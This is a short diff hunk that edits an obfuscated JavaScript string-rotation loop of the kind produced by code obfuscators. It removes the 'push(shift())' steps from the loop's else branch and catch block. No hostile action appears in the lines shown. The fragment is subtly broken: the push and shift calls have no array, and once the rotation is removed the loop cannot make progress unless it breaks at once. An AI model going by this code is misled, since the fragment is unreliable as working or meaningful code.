@@ -2987,10 +2987,7 @@
           (parseInt("155432OeGIQS") / 0x8) * (-parseInt("396CKTurr") / 0x9) + parseInt("30770070DOGVeo") / 0xa;
       if (exitCode === _0x1fd245)
         break;
-      else
-        push(shift());
     } catch (ex) {
-      push(shift());
     }
   }
 })();
